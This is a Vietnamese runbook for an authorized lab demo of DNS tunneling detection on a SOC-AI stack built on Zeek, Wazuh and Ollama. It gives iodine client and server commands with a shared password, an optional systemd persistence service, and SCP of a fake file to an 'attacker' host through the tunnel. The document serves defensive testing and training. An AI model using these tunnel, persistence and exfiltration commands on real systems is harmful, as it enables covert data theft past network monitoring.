# Kịch bản demo DNS tunneling trên SOC-AI

Tài liệu này dành cho lab được phép kiểm thử. Mục tiêu là trình bày từ lúc làm
sạch môi trường, tạo lưu lượng DNS, đối chiếu cảnh báo và điều tra, đến khi dừng
demo và chuẩn bị cho lần tiếp theo. File dùng dữ liệu **giả lập**, không thu thập
mật khẩu, lịch sử lệnh hay các tệp thật trên máy.

## 1. Mô hình và kết quả cần chứng minh

| Thành phần | Địa chỉ/lưu ý |
|---|---|
| Victim | `192.168.19.129`; chạy Zeek và Wazuh Agent |
| Attacker | `192.168.19.130`; chạy `iodined` và SSH server |
| DNS tunnel | `tunnel.lab.local`; server trong tunnel `10.0.0.1` |
| SOC | Wazuh Manager, forwarder, SOC-AI và Ollama trong Docker trên Windows |

Thay các địa chỉ nếu lab thực tế khác. Trước khi chạy, xác nhận mạng `10.0.0.0/27`
không trùng với mạng đang sử dụng. Phiên demo gồm hai phép thử riêng:

1. Các query DNS mô phỏng kiểm tra rule: có thể gây cảnh báo, nhưng không chứng
   minh đã tạo tunnel hay truyền dữ liệu.
2. Kết nối iodine thực tế và truyền một file giả qua SSH trong tunnel: kiểm tra
   ở cả hai đầu và đối chiếu log. Cảnh báo DNS không nhất thiết xuất hiện nếu
   query không khớp điều kiện rule.

Kịch bản chính chạy iodine thủ công, không tự tạo cron. Mục 5.1 có một cách
**tùy chọn** để trình bày persistence bằng một service riêng, có bước tắt rõ ràng.

## 2. Reset trước demo

### 2.1. Victim: dừng service và client cũ

```bash
sudo systemctl disable --now net-helper.service
sudo systemctl disable --now network-update-helper.service
```

Nếu service không tồn tại, đọc thông báo rồi tiếp tục. Trước đây hai service này
chạy iodine và có thể tự khởi động lại. Nếu đã dùng service tùy chọn của tài liệu
này trong lần trước, tắt thêm:

```bash
sudo systemctl disable --now socai-iodine-demo.service
```

Xem tiến trình còn lại:

```bash
pgrep -l -x iodine
```

Nếu còn tiến trình và đã xác nhận **tất cả tiến trình iodine trên Victim đều thuộc
lab này**, dừng chúng:

```bash
sudo pkill -x iodine
```

Xem cron của user `victim`:

```bash
crontab -l
```

Nếu còn các dòng `@reboot` gọi iodine cho `tunnel.lab.local`, mở:

```bash
crontab -e
```

Xóa tất cả **những dòng iodine của demo**, lưu lại và kiểm tra `crontab -l`.
Không dùng `crontab -r`, vì nó xóa cả những lịch khác của user. Root từng không
có cron theo kết quả kiểm tra trước; nếu nghi có thay đổi, xem `sudo crontab -l`.

Xác nhận:

```bash
systemctl is-active net-helper.service
systemctl is-active network-update-helper.service
pgrep -l -x iodine
ip -br -4 addr
```

Hai service không còn `active`; `pgrep` không có kết quả. Tên interface có thể
khác `dns0`; sự hiện diện của interface đơn lẻ không xác nhận tunnel đang hoạt động.

### 2.2. Attacker: dừng server cũ

Nếu `iodined` đang chạy ở terminal của bạn, nhấn `Ctrl+C`. Kiểm tra:

```bash
pgrep -l -x iodined
```

Nếu còn tiến trình và đã xác định tất cả `iodined` thuộc lab, chạy:

```bash
sudo pkill -x iodined
```

Không xóa log Zeek/Wazuh hoặc toàn bộ `/tmp`. Các file demo mới bên dưới có ID
riêng để không nhầm với kết quả cũ. Nếu muốn dọn các file cũ, liệt kê, xác nhận
từng tên rồi chỉ xóa các file thực sự thuộc demo.

## 3. Kiểm tra trước khi bắt đầu

### Victim

```bash
ip -br -4 addr
sudo /opt/zeek/bin/zeekctl status
sudo systemctl status wazuh-agent --no-pager
sudo tail -n 3 /opt/zeek/logs/current/dns.log
```

Zeek và Wazuh Agent cần hoạt động; `dns.log` cần là JSON. Trên một terminal riêng,
theo dõi dòng mới:

```bash
sudo tail -n 0 -F /opt/zeek/logs/current/dns.log
```

Giữ cửa sổ này mở. Dùng `Ctrl+C` khi muốn dừng xem.

### Windows — PowerShell

```powershell
cd E:\Pictures\SOC-AI
docker compose -f docker-compose.yml -f data/local-runtime.compose.yml --profile app ps
docker compose -f docker-compose.yml -f data/local-runtime.compose.yml --profile app exec wazuh-manager /var/ossec/bin/agent_control -l
```

Xác nhận Manager, forwarder, SOC-AI, Ollama đang chạy và Victim kết nối. Mở
`http://localhost:8100/`. Nếu Zeek có log mà SOC không có, kiểm tra cấu hình thu
local và cấu hình tập trung trước khi thêm nguồn; chỉ thu một lần cùng file.

### Attacker

```bash
ip -br -4 addr
sudo ss -lunp | grep ':53 '
sudo ss -ltnp | grep ':22 '
```

Cổng UDP 53 phải sẵn sàng cho iodined; nếu đã có tiến trình khác dùng cổng, xác
định và xử lý theo cấu hình lab. Muốn thực hiện bước truyền file thì SSH server
phải lắng nghe trên địa chỉ thích hợp và user `attacker` đăng nhập được. SSH có
thể được cấu hình sau khi tunnel lên; không cần tắt kiểm tra khóa máy chủ.

## 4. Ghi nhận baseline

Ghi lại giờ UTC và trạng thái trước khi chạy:

```bash
date -u
pgrep -l -x iodine
```

Quan sát các truy vấn bình thường trong `dns.log` khoảng 30–60 giây. Ghi lại số
liệu và nguồn theo log thực tế; không coi khoảng quan sát ngắn là baseline đầy đủ.

## 5. Khởi động DNS tunnel

### Attacker — terminal 1

```bash
sudo iodined -f -c -P matkhau123 10.0.0.1 tunnel.lab.local
```

Giữ terminal này mở. Cần thấy `Listening to dns for domain tunnel.lab.local`.
Đây mới là server đang lắng nghe, chưa chứng minh client kết nối thành công.

### Victim — terminal 1

Nếu muốn trình bày persistence, dùng **mục 5.1 thay cho lệnh client thủ công**
dưới đây; không chạy đồng thời cả hai cách.

```bash
sudo iodine -f -r -P matkhau123 192.168.19.130 tunnel.lab.local
```

Giữ terminal này mở. `-r` yêu cầu iodine dùng DNS thay vì tự chuyển sang raw UDP,
giúp sensor thấy lưu lượng DNS trong lab. `-f` giữ tiến trình ở foreground. Chờ
thông báo kết nối thành công; nếu báo `No suitable DNS query type found`, không
tiếp tục tuyên bố tunnel đã kết nối.

### 5.1. Tùy chọn: mô phỏng persistence bằng một service

Chỉ làm trong lab và chỉ dùng khi không chạy client thủ công ở trên. Trên Victim,
tạo một service demo riêng; mật khẩu này chỉ dành cho môi trường thử nghiệm:

```bash
sudo install -m 600 /dev/stdin /etc/systemd/system/socai-iodine-demo.service <<'EOF'
[Unit]
Description=SOC-AI iodine demo
After=network-online.target

[Service]
ExecStart=/usr/sbin/iodine -f -r -P matkhau123 192.168.19.130 tunnel.lab.local
Restart=on-failure
RestartSec=15

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable --now socai-iodine-demo.service
sudo systemctl status socai-iodine-demo.service --no-pager
```

Service được bật để chạy khi khởi động; khi lỗi, nó có thể thử lại sau 15 giây.
`active` chỉ cho biết tiến trình đang chạy, không chứng minh tunnel đã kết nối.
Quan sát `sudo journalctl -u socai-iodine-demo.service -n 30 --no-pager` và tiếp
tục kiểm tra route ở dưới. Không thêm cron. Sau khi trình bày, bắt buộc dừng và
tắt service bằng lệnh ở mục 9 để tránh sinh lưu lượng ngoài ý muốn.

### Victim — terminal 2

```bash
ip -br -4 addr
ip route get 10.0.0.1
ping -c 3 10.0.0.1
```

Client thường nhận `10.0.0.x` trên interface tunnel; kiểm tra route đi qua đúng
interface. `ping` chỉ là một phép kiểm tra: thất bại có thể do chặn ICMP hoặc kết
nối lỗi, không tự xác định nguyên nhân. `10.0.0.1` là IP **trong** tunnel, còn
`192.168.19.130` là IP mạng dùng để liên hệ server ban đầu.

## 6. Kiểm tra rule bằng query mô phỏng

Chạy trên Victim, terminal 2:

```bash
for i in $(seq 1 6); do
  query=$(printf 'labtest%010d%025d.tunnel.lab.local' "$(date +%s)" "$i")
  echo "$query"
  dig @192.168.19.130 "$query" A +tries=1 +time=1
  sleep 1
done
```

Các tên có label dài khác nhau để thử nhánh rule dài. Lệnh có thể timeout nếu
server không trả lời query thử; Zeek vẫn có thể ghi truy vấn đã thấy. Đây là
traffic kiểm thử, không phải chứng cứ tunnel đã truyền file. Theo dõi Zeek và SOC.

Trong repo: `100152` là dấu hiệu label dài được SOC phân loại telemetry;
label có byte được Zeek biểu diễn dạng `\xNN` cũng có thể khớp, mỗi escape tính
là một byte. Label dài hoặc byte bất thường không chứng minh hành vi độc hại.
`100153`/`100157` là rule tương quan có thể xuất hiện tùy nhánh khớp. `100154`
hiện là cảnh báo ứng viên để điều tra thủ công; `100155` vẫn là telemetry.
`100156` và `100181` có điều kiện riêng. Không
cam kết mọi ID cùng xuất hiện. Các rule `100153`, `100156`, `100157` không còn
`ignore=300`, nhưng vẫn cần đủ điều kiện tương quan. Xem [bộ rule](../docker/wazuh/zeek-notice-rules.xml)
và [hướng dẫn logtest](kiem-tra-dns-wazuh.md).

Kiểm tra các query đã ghi:

```bash
sudo grep -F 'tunnel.lab.local' /opt/zeek/logs/current/dns.log | tail -n 20
```

PowerShell trên Windows, xem một phần alerts của Manager:

```powershell
docker compose -f docker-compose.yml -f data/local-runtime.compose.yml --profile app exec wazuh-manager tail -n 5000 /var/ossec/logs/alerts/alerts.json | Select-String '100153|100156|100157|100181'
```

Nếu Manager có alert mà SOC chưa hiển thị, kiểm tra forwarder và thời gian nhận.
Kết quả `tail` chỉ là mẫu gần cuối, không phải toàn bộ alert.

## 7. Truyền dữ liệu giả qua tunnel

Chỉ thực hiện sau khi bước 5 đã xác nhận kết nối và server SSH có thể truy cập
qua `10.0.0.1:22`. User `attacker` phải đăng nhập hợp lệ. Trên Victim terminal 2:

```bash
DEMO_ID=$(date -u +%Y%m%dT%H%M%SZ)
DEMO_FILE="/tmp/socai-dns-demo-${DEMO_ID}.txt"
printf 'DU LIEU GIA LAP SOC-AI\nDemo ID: %s\n' "$DEMO_ID" > "$DEMO_FILE"
echo "File: $DEMO_FILE"
sha256sum "$DEMO_FILE"
```

Kiểm tra SSH, đối chiếu fingerprint với quản trị lab khi được hỏi:

```bash
ssh attacker@10.0.0.1 'echo SSH_trong_tunnel_OK'
```

Truyền file; dùng ID riêng để phân biệt từng lượt và kiểm tra kết quả lệnh:

```bash
REMOTE_FILE="/tmp/socai-dns-demo-${DEMO_ID}.txt"
if scp "$DEMO_FILE" "attacker@10.0.0.1:$REMOTE_FILE"; then
  echo "SCP thanh cong: $REMOTE_FILE"
else
  echo 'SCP that bai: chua the ket luan du lieu da duoc truyen.'
fi
```

Trên cùng terminal Victim, sau khi SCP thành công, đối chiếu hash:

```bash
sha256sum "$DEMO_FILE"
ssh attacker@10.0.0.1 "sha256sum '$REMOTE_FILE'"
```

Hai giá trị SHA-256 bằng nhau là bằng chứng file giả có cùng nội dung tại hai đầu.
Kết quả DNS đơn lẻ không đủ xác nhận file nào đã truyền. Nếu lệnh báo timeout,
kiểm tra lại route, SSH server, cổng 22 và trạng thái iodine; không ghép hoặc đọc
file cũ để làm bằng chứng cho lượt mới.

## 8. Xem cảnh báo và điều tra

Trên SOC-AI mở Cảnh báo rồi chọn cuộc điều tra khớp IP, rule và thời gian vừa
chạy. Ghi lại:

- Rule kích hoạt, thời điểm, IP nguồn/đích và domain quan sát được.
- Query mẫu, loại DNS, phạm vi thời gian và số lượng được tool tổng hợp.
- Tool nào đã thực sự chạy, kết quả rỗng hoặc bị cắt, cùng bằng chứng tương ứng.
- Nhận định của AI, thông tin chưa xác minh và nguồn playbook nếu có.

Đối chiếu số liệu với Zeek/Wazuh. `dns.log` là các bản ghi quan sát, không nhất
thiết bằng số gói và không chứng minh lượng dữ liệu truyền. Sự thay đổi file hoặc
truy vấn DNS riêng lẻ không đủ chứng minh hành vi độc hại; chú ý khả năng cảnh báo
nhầm và so sánh baseline. AI và tài liệu tra cứu không thay thế bằng chứng gốc.

## 9. Kết thúc và làm lại

1. Trên Victim terminal 1, nhấn `Ctrl+C` để dừng iodine client. Nếu dùng service
   tùy chọn thay cho client thủ công, chạy `sudo systemctl disable --now socai-iodine-demo.service`.
2. Trên Attacker terminal 1, nhấn `Ctrl+C` để dừng iodined server.
3. Kiểm tra `pgrep -l -x iodine` trên Victim và `pgrep -l -x iodined` trên Attacker.
4. Kiểm tra hai service và cron như mục 2 nếu còn nghi chạy nền.
5. Lưu thời gian, alert ID và hash file giả nếu cần báo cáo. Log và hồ sơ không
   bị xóa trong quy trình này.
6. Khi làm lại, quay về mục 2 rồi tiếp tục. Các rule DNS tunneling nói trên không
   yêu cầu chờ 5 phút; mỗi lần mục 7 tạo một ID file mới.

## 10. Xử lý nhanh khi không thấy cảnh báo

| Biểu hiện | Kiểm tra tiếp |
|---|---|
| Iodine không kết nối | IP server, UDP 53, firewall lab, phiên bản client/server và log hai đầu |
| Có truy vấn nhưng thiếu phản hồi | DNS server có nhận và trả lời không; kiểm tra packet hai chiều |
| Zeek không có `dns.log` mới | Trạng thái Zeek, interface sensor, đường đi gói tin, định dạng JSON |
| Có Zeek nhưng không có alert | Agent có thu đúng một nguồn, trường `query`/`qtype_name`, location và ngưỡng rule |
| Có Manager alert nhưng SOC không thấy | Forwarder, bộ lọc SOC, thời gian nhận và trạng thái container |
| Chỉ thấy telemetry | `100152`/`100155` là dấu hiệu; `100154` hiện là cảnh báo ứng viên; rule tương quan cần điều kiện riêng |
| SCP thất bại | Tunnel/route, `sshd`, cổng 22, tài khoản và khóa SSH; không tuyên bố đã truyền file |

Chỉ dùng `wazuh-logtest` để kiểm tra cú pháp/nhánh rule; logtest không tạo traffic
thật hay xác nhận toàn bộ pipeline Zeek → Agent → Manager → SOC.

## 11. Giải thích thuật ngữ

### 11.1. Máy và hoạt động trong kịch bản

| Thuật ngữ | Giải thích trong demo |
|---|---|
| **Lab** | Môi trường thử nghiệm được phép kiểm soát; ở đây gồm Victim, Attacker và hệ thống SOC-AI. |
| **Victim** | Máy giả lập nạn nhân, trong mô hình này là `192.168.19.129`. Máy chạy Zeek và Wazuh Agent. |
| **Attacker** | Máy giả lập phía đối lập, trong mô hình này là `192.168.19.130`. Máy chạy iodine server. Tên này chỉ vai trò trong lab. |
| **Payload** | Đoạn chương trình dùng để mô phỏng hành động trong kịch bản. Tên file có đuôi `.pdf` không làm cho một script Bash trở thành tài liệu PDF. |
| **Persistence** | Cơ chế giúp chương trình có thể chạy lại hoặc tồn tại sau khi người dùng thoát hay máy khởi động lại. Bản demo chỉ dùng service tùy chọn; không tự thêm cron. |
| **Systemd service** | Cấu hình cho Ubuntu biết phải chạy và quản lý một chương trình như thế nào. `enabled` nghĩa là được cấu hình để tự khởi động theo cơ chế tương ứng; `active` cho biết trạng thái hiện tại, không chứng minh kết nối thành công. |
| **Cron / `@reboot`** | Cron là bộ lập lịch; `@reboot` yêu cầu chạy một lệnh khi máy khởi động. Nhiều dòng trùng có thể tạo nhiều tiến trình. |
| **Recon** | Thu thập thông tin về máy hoặc môi trường. Trong demo nên giới hạn ở dữ liệu giả và thông tin được phép sử dụng. |
| **C2 / Command and Control** | Kênh để bên điều khiển liên lạc với một máy. Query DNS hay kết nối tunnel riêng lẻ chưa chứng minh đã có lệnh điều khiển được thực thi. |
| **Beacon** | Tín hiệu liên lạc lặp lại để kiểm tra hoặc duy trì liên lạc. Query lặp không tự xác nhận ai điều khiển hay nội dung lệnh. |
| **Exfiltration** | Việc đưa dữ liệu ra khỏi nơi lưu trữ ban đầu. Demo chỉ truyền file giả và phải kiểm tra kết quả ở đầu nhận trước khi kết luận file đã tới. |

### 11.2. DNS và iodine

| Thuật ngữ | Giải thích trong demo |
|---|---|
| **DNS** | Giao thức dùng để hỏi và nhận thông tin về tên. Một truy vấn gồm tên được hỏi và loại bản ghi mong muốn. |
| **DNS tunneling** | Cách mang dữ liệu qua các truy vấn và phản hồi DNS. Zeek có thể quan sát các dấu hiệu liên quan, nhưng một query lạ không đủ chứng minh tunnel. |
| **Query / truy vấn** | Yêu cầu DNS do một máy gửi. Ví dụ `abc.tunnel.lab.local`. |
| **Domain / tên miền** | Tên dùng trong DNS. Trong lab, `tunnel.lab.local` là tên phía server iodine sử dụng. |
| **Subdomain / tên miền phụ** | Tên nằm dưới một domain. Ví dụ `abc.tunnel.lab.local` là tên dưới `tunnel.lab.local`. |
| **Label** | Một phần của tên DNS được ngăn bằng dấu chấm. Ví dụ `abc.tunnel.lab.local` có các label `abc`, `tunnel`, `lab`, `local`. Rule có thể kiểm tra độ dài và ký tự của từng label. |
| **Qtype / loại query** | Loại bản ghi được hỏi, ví dụ `A`, `TXT`, `NULL` hoặc `CNAME`. `NULL` là loại query, không phải mã lỗi hay kết luận tấn công. |
| **Rcode / mã phản hồi** | Kết quả DNS server trả về. `NOERROR` là phản hồi không báo lỗi theo mã DNS đó; `NXDOMAIN` là phản hồi cho biết tên được hỏi không tồn tại. |
| **Iodine client / server** | `iodine` chạy ở Victim; `iodined` chạy ở Attacker. Hai đầu phối hợp tạo đường truyền IPv4 qua DNS nếu kết nối thành công và client dùng chế độ DNS. |
| **Interface `dns0`** | Giao diện mạng ảo mà iodine có thể tạo, ví dụ phía Victim có `10.0.0.2` và phía server có `10.0.0.1`. Chỉ thấy interface chưa chứng minh file đã truyền thành công. |
| **Raw UDP** | Chế độ iodine có thể dùng để truyền trực tiếp qua UDP nếu điều kiện cho phép. Lưu lượng đó không nhất thiết được ghi thành query DNS; dùng `-r` ở client để yêu cầu chế độ DNS trong demo. |
| **`-f`, `-r` của iodine** | `-f` giữ chương trình chạy ở foreground; `-r` ngăn chuyển sang raw UDP. Đây là tùy chọn của iodine, không phải tham số rule Wazuh. |
| **`dig`** | Công cụ gửi truy vấn DNS để kiểm tra phản hồi và tạo query thử trong lab. |
| **`\xNN`** | Cách Zeek có thể biểu diễn một byte trong tên DNS bằng chuỗi escape. Một escape biểu diễn một byte; sự xuất hiện của nó không tự chứng minh dữ liệu độc hại. |
| **Mã hóa biểu diễn / mã hóa bảo mật** | Encoding thay đổi cách biểu diễn dữ liệu; encryption dùng thuật toán và khóa để bảo vệ nội dung. Không thể kết luận có encryption chỉ vì tên DNS trông ngẫu nhiên. |

### 11.3. Log, rule và điều tra

| Thuật ngữ | Giải thích trong demo |
|---|---|
| **Zeek** | Sensor phân tích lưu lượng mạng và ghi lại sự kiện quan sát được, như DNS vào `dns.log` và kết nối vào `conn.log`. Một dòng log không nhất thiết là một gói tin. |
| **Wazuh Agent** | Thành phần trên Victim thu thập dữ liệu theo cấu hình và chuyển về Wazuh Manager. Agent báo đang kết nối không tự chứng minh mọi file log đã được thu đúng. |
| **Wazuh Manager** | Thành phần nhận sự kiện, giải mã và áp dụng rule để tạo kết quả phát hiện theo cấu hình. |
| **Rule / Rule ID / level** | Rule là điều kiện xử lý log; ID định danh rule; level biểu thị mức do Wazuh gán. Level và việc SOC có tự điều tra bằng AI là hai quyết định khác nhau. |
| **Telemetry** | Dữ liệu quan sát được giữ để tra cứu hoặc làm bối cảnh, chưa nhất thiết được SOC xếp là cảnh báo bảo mật. |
| **Alert / cảnh báo** | Một sự kiện được hệ thống phân loại để chuyên viên chú ý. Alert thể hiện dấu hiệu cần xem xét, không tự chứng minh tấn công thành công. |
| **`frequency` / `timeframe`** | Điều kiện tương quan của Wazuh: số lần rule xét cùng một khoảng thời gian. Các điều kiện `same_field` và `different_field` cũng phải được đáp ứng. |
| **`ignore`** | Khoảng Wazuh tạm bỏ qua một rule sau khi rule đó đã phát cảnh báo. Các rule `100153`, `100156`, `100157` hiện không đặt khoảng `ignore=300`. |
| **Wazuh archives / alerts** | Hai nguồn lưu sự kiện và alert của Manager. Một sự kiện có thể xuất hiện trong cả hai; không cộng số dòng một cách máy móc để suy ra số sự kiện duy nhất. |
| **Forwarder** | Thành phần chuyển sự kiện từ Wazuh sang SOC-AI. Hàng đợi và trạng thái của forwarder giúp kiểm tra có chuyển trễ hay lỗi. |
| **Bằng chứng / evidence** | Bản ghi hoặc kết quả quan sát có nguồn và phạm vi rõ ràng. Cần phân biệt bằng chứng gốc, số liệu tổng hợp và nhận định do model tạo. |
| **Baseline** | Dữ liệu ở giai đoạn so sánh để đánh giá hoạt động hiện tại có bất thường không. Một khoảng quan sát ngắn chưa chắc đại diện cho hoạt động bình thường. |
| **`wazuh-logtest`** | Công cụ thử decoder và rule bằng log mẫu; không tự tạo traffic thật hoặc kiểm tra toàn bộ đường truyền thu thập. |

### 11.4. AI, kho tri thức và kiểm chứng

| Thuật ngữ | Giải thích trong demo |
|---|---|
| **AI local / model điều tra** | Model chạy trong môi trường của bạn qua Ollama, hỗ trợ chọn hoặc sử dụng thông tin điều tra và viết đánh giá. Kết luận vẫn cần chuyên viên đối chiếu bằng chứng. |
| **Tool điều tra** | Hàm cho model hoặc workflow tra cứu/tổng hợp dữ liệu đã lưu, ví dụ `search_zeek_dns` hoặc `summarize_dns_activity`. Tool rỗng không chứng minh sự kiện không xảy ra. |
| **RAG / kho tri thức** | Cơ chế tìm đoạn tài liệu liên quan rồi cung cấp cho model để tham khảo. Tài liệu hướng dẫn không phải bằng chứng đã xảy ra trên Victim. |
| **Embedding / ChromaDB** | Embedding biểu diễn văn bản thành vector; ChromaDB lưu chỉ mục để tìm tài liệu tương tự. Model embedding không tự phát hiện tấn công. |
| **Playbook** | Tài liệu hướng dẫn kiểm tra và phản ứng theo loại sự cố. Một gợi ý cần phù hợp với bằng chứng và phạm vi sự cố thực tế. |
| **Hàng đợi AI** | Các lượt điều tra chờ worker xử lý. Nút tạm dừng không xóa hàng đợi cũ; cảnh báo mới trong thời gian tạm dừng không tự được đưa vào hàng đợi. |
| **SCP / SSH** | SSH là giao thức truy cập từ xa; SCP truyền file qua SSH. Trong demo, SCP chỉ đi qua tunnel nếu đường mạng tới `10.0.0.1` thực sự đi qua interface iodine. |
| **SHA-256 / hash** | Hàm tạo giá trị đại diện cho nội dung file. Hash giống nhau ở hai đầu là bằng chứng hỗ trợ rằng hai bản file có cùng nội dung; cần đối chiếu đúng file và đúng lượt demo. |
| **MITRE ATT&CK T1071.004** | Mã kỹ thuật mô tả việc sử dụng DNS như giao thức tầng ứng dụng cho liên lạc điều khiển. Gắn mã vào rule không tự xác nhận đã có C2. |
